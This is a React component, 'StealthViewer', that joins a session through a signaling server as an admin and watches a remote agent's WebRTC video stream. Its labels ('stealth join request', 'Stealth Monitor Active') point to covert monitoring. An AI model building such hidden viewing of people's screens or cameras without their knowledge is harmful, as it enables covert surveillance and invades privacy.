import React, { useState, useEffect, useRef } from 'react';
import { io } from 'socket.io-client';
import { Eye, EyeOff, Play, ShieldAlert, Wifi, WifiOff } from 'lucide-react';

const SIGNALING_URL = (import.meta.env.VITE_SIGNALING_URL || 'https://onechameleon.onrender.com').replace(/\/$/, '');

export default function StealthViewer({ sessionId }) {
  const [isOpen, setIsOpen] = useState(false);
  const [isConnected, setIsConnected] = useState(false);
  const [error, setError] = useState('');
  
  const videoRef = useRef(null);
  const socketRef = useRef(null);
  const pcRef = useRef(null);
  const iceServersRef = useRef([
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:443' },
    { urls: 'stun:stun.cloudflare.com:3478' }
  ]);

  useEffect(() => {
    if (isOpen) {
      startStealthStream();
    } else {
      stopStealthStream();
    }

    return () => {
      stopStealthStream();
    };
  }, [isOpen]);

  const startStealthStream = () => {
    setError('');
    setIsConnected(false);

    try {
      // 1. Connect to signaling server
      const socket = io(SIGNALING_URL);
      socketRef.current = socket;

      socket.on('connect', () => {
        // Send stealth join request
        socket.emit('admin:join_session', { sessionId });
      });

      socket.on('error', (err) => {
        setError(err.message || 'Failed to establish connection');
      });

      // ── WebRTC Signaling ──
      socket.on('admin:signal:sdp', async ({ sdp, from }) => {
        try {
          if (!pcRef.current) return;
          
          await pcRef.current.setRemoteDescription(new RTCSessionDescription(sdp));
          
          if (sdp.type === 'offer') {
            const answer = await pcRef.current.createAnswer();
            await pcRef.current.setLocalDescription(answer);
            
            socket.emit('admin:signal:sdp', {
              sessionId,
              sdp: pcRef.current.localDescription,
              to: from // Return SDP answer back to the agent
            });
          }
        } catch (err) {
          console.error('[Stealth WebRTC] SDP Error:', err);
          setError('Handshake negotiation failed');
        }
      });

      socket.on('admin:signal:ice', async ({ candidate }) => {
        try {
          if (pcRef.current && candidate) {
            await pcRef.current.addIceCandidate(new RTCIceCandidate(candidate));
          }
        } catch (err) {
          console.warn('[Stealth WebRTC] ICE Error:', err);
        }
      });

      socket.on('session:ended', () => {
        setError('Remote agent went offline');
        stopStealthStream();
      });

      // 2. Initialize WebRTC Peer Connection
      const pc = new RTCPeerConnection({
        iceServers: iceServersRef.current,
        bundlePolicy: 'max-bundle'
      });
      pcRef.current = pc;

      pc.onicecandidate = (event) => {
        if (event.candidate) {
          socket.emit('admin:signal:ice', {
            sessionId,
            candidate: event.candidate,
            to: null // Send to agent
          });
        }
      };

      pc.onconnectionstatechange = () => {
        console.log('[Stealth WebRTC] State:', pc.connectionState);
        if (pc.connectionState === 'connected') {
          setIsConnected(true);
        } else if (pc.connectionState === 'failed' || pc.connectionState === 'closed') {
          setIsConnected(false);
        }
      };

      pc.ontrack = (event) => {
        console.log('[Stealth WebRTC] Received stream track:', event.streams);
        if (videoRef.current && event.streams[0]) {
          videoRef.current.srcObject = event.streams[0];
          videoRef.current.play().catch(err => {
            console.warn('[Stealth WebRTC] Play failed:', err);
          });
        }
      };

    } catch (err) {
      setError(err.message);
    }
  };

  const stopStealthStream = () => {
    setIsConnected(false);

    if (pcRef.current) {
      pcRef.current.close();
      pcRef.current = null;
    }

    if (socketRef.current) {
      socketRef.current.disconnect();
      socketRef.current = null;
    }

    if (videoRef.current) {
      videoRef.current.srcObject = null;
    }
  };

  return (
    <div className="border-t border-slate-900 pt-3 mt-3">
      <div className="flex justify-between items-center">
        <span className="text-[10px] text-slate-500 uppercase font-semibold tracking-wider flex items-center space-x-1">
          <ShieldAlert className="w-3.5 h-3.5 text-cyan-400" />
          <span>Stealth Administrative Stream</span>
        </span>
        <button
          onClick={() => setIsOpen(!isOpen)}
          className={`flex items-center space-x-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold uppercase tracking-wider transition-all border ${
            isOpen
              ? 'bg-red-500/10 hover:bg-red-500/20 text-red-400 border-red-500/20'
              : 'bg-cyan-500/10 hover:bg-cyan-500/20 text-cyan-400 border-cyan-500/20'
          }`}
        >
          {isOpen ? (
            <>
              <EyeOff className="w-3.5 h-3.5" />
              <span>Close View</span>
            </>
          ) : (
            <>
              <Eye className="w-3.5 h-3.5" />
              <span>Stealth View</span>
            </>
          )}
        </button>
      </div>

      {isOpen && (
        <div className="mt-3 bg-black border border-slate-900 rounded-xl overflow-hidden relative aspect-video flex items-center justify-center">
          {error ? (
            <div className="text-red-400 text-xs p-4 text-center space-y-1">
              <p className="font-bold">Stream Failed</p>
              <p>{error}</p>
            </div>
          ) : !isConnected ? (
            <div className="text-slate-500 text-xs text-center space-y-2 animate-pulse flex flex-col items-center">
              <WifiOff className="w-6 h-6 text-slate-600" />
              <p>Establishing secure stealth tunnel...</p>
            </div>
          ) : null}

          {/* Local stealth rendering video player */}
          <video
            ref={videoRef}
            muted
            playsInline
            className={`w-full h-full object-contain ${isConnected ? 'block' : 'hidden'}`}
          />

          {isConnected && (
            <div className="absolute top-3 left-3 bg-red-650/80 bg-red-600/80 text-white font-bold text-[9px] uppercase tracking-widest px-2.5 py-1 rounded flex items-center space-x-1 animate-pulse">
              <span className="w-1.5 h-1.5 bg-white rounded-full"></span>
              <span>Stealth Monitor Active</span>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
